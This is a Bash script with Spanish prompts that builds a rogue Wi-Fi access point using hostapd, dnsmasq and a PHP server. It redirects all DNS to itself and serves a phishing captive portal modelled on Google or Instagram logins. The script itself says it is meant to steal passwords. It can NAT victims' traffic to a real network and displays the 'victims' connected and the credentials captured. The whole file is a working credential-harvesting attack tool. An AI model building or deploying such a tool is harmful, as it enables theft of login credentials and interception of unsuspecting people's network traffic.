#!/bin/bash
# Por Hugo Vidal 2024-2025
export TERM=xterm
trap ctrl_c INT
function ctrl_c(){
	echo -e " Saliendo..."
	modo="$(iw dev $moninterface info | awk '/type/ {print $2}')"
	if [[ "$modo" == "monitor" || "$modo" == "AP" ]]; then
		ifconfig $moninterface down >/dev/null 2>&1; sleep 1
		iwconfig $moninterface mode monitor >/dev/null 2>&1; sleep 1
		ifconfig $moninterface up >/dev/null 2>&1
		airmon-ng stop $moninterface > /dev/null 2>&1
		systemctl start wpa_supplicant NetworkManager > /dev/null 2>&1
	fi
	rm -r content 2>/dev/null
	exit 0
}

##############################    datos    ########################################################

moninterface=$(/bin/cat ./content/interfaz)

function programas_ap(){
	echo -e "\nComprobando programas necesarios...\n"
	sleep 1
	programaslist=("dnsmasq" "hostapd" "php")

	for programa in "${programaslist[@]}"; do
		if [ "$(which $programa)" ]; then
			echo ". . . . $programa esta instalado"
		else
			echo ". . . . $programa no esta instalado :("
			exit 0
		fi
	done; echo -e "\nTodo en orden :)\n"
	sleep 2; clear
}
function datos_ap(){
	echo -ne "\nSSID de la red: " && read -r use_ssid
	echo -ne "\nEspecifique un canal (1-12): " && read -r use_channel
	echo -ne "\nQuiere que el punto de acceso tenga contraseña?: " && read -r passyesno
	if [ "$passyesno" == "si" ]; then
		echo -ne "\nEspecifique la contraseña: " && read -r pass
	fi
	echo -ne "\nQuiere que quere crear un portal cautivo con algun login para intentar robar alguna contrasena?: " && read -r portalyesno
	if [ "$portalyesno" == "si" ]; then
		echo -ne "\nIntroduzca la plantilla para el portal cautivo (google, instagram): " && read -r pagina
	fi

	echo -ne "\nQuiere que se redirijan los datos a una red externa para que los clientes tengan conexion?: " && read -r redirectyesno
	if [ "$redirectyesno" == "si" ]; then
		echo -ne "Especifique una interfaz conectada a otra red wifi: " && read -r redirecti
	fi


}
##############################    Ataque    ##########################################

function start_ap(){
	echo -e "\nCreando el ap\n"
	echo -e "interface=$moninterface\n" > content/hostapd.conf
	echo -e "driver=nl80211\n" >> content/hostapd.conf
	echo -e "ssid=$use_ssid\n" >> content/hostapd.conf
	echo -e "hw_mode=g\n" >> content/hostapd.conf
	echo -e "channel=$use_channel\n" >> content/hostapd.conf
	echo -e "macaddr_acl=0\n" >> content/hostapd.conf
	echo -e "auth_algs=1\n" >> content/hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> content/hostapd.conf
	if [ "$passyesno" == "si" ]; then
		echo -e "wpa=2\n" >> content/hostapd.conf
		echo -e "wpa_passphrase=$pass" >> content/hostapd.conf
	fi

	sleep 1
	echo -e ". . . . Configurando hostapd"
	hostapd content/hostapd.conf > /dev/null 2>&1 &
	sleep 2
	
	echo -e ". . . . Configurando dnsmasq"
	echo -e "interface=$moninterface\n" > content/dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> content/dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> content/dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> content/dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> content/dnsmasq.conf
	echo -e "log-queries\n" >> content/dnsmasq.conf
	echo -e "log-dhcp\n" >> content/dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> content/dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> content/dnsmasq.conf
	sleep 2

	ifconfig $moninterface up 192.168.1.1 netmask 255.255.255.0
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	dnsmasq -C content/dnsmasq.conf -d > /dev/null 2>&1 &
	echo -e "\nAp con nombre $use_ssid creado\n"
	sleep 1
}

function hosts_connect(){
	activehosts=0
	datoscap=""
	while true;do
		echo -e "\n----------------------------------------------------------"
		echo -e "\nVictimas conectadas: $activehosts\n"
		echo -e "\nDatos capturados: $datoscap\n"
		echo -e "----------------------------------------------------------"
		activehosts=$(bash ./utils/hostsconnect.sh | grep -v "192.168.1.1 " | wc -l 2> /dev/null)
		datoscap=$(/bin/cat ./datos.txt 2>/dev/null)
#		activehosts=$(bash ./utils/hostsconnect.sh | grep -v "192.168.1.1 ")
#		echo "active hosts: $activehosts"
		sleep 2; clear
	done

}

function portal(){
	echo -e ". . . . Configurando portal cautivo"
	sleep 1
	pushd pages/$pagina > /dev/null 2>&1
	echo "" > ../../datos.txt
	php -S 192.168.1.1:80 > /dev/null 2>&1 &
	sleep 2
	popd > /dev/null 2>&1
}

function redirect_data(){
	echo -e ". . . . Configurando el enrutamiento ip con iptables"
	sleep 1
	sysctl -w net.ipv4.ip_forward=1
	iptables -t nat -A POSTROUTING -o $redirecti -j MASQUERADE
	iptables -A FORWARD -i $redirecti -o $moninterface -m state --state RELATED,ESTABLISHED -j ACCEPT
	iptables -A FORWARD -i $moninterface -o $redirecti -j ACCEPT
}

################################    Inicio del programa    #############################

clear
programas_ap
datos_ap
start_ap

if [ "$portalyesno" == "si" ]; then
	portal
fi
if [ "$redirectyesno" == "si" ]; then
	redirect_data
fi

hosts_connect

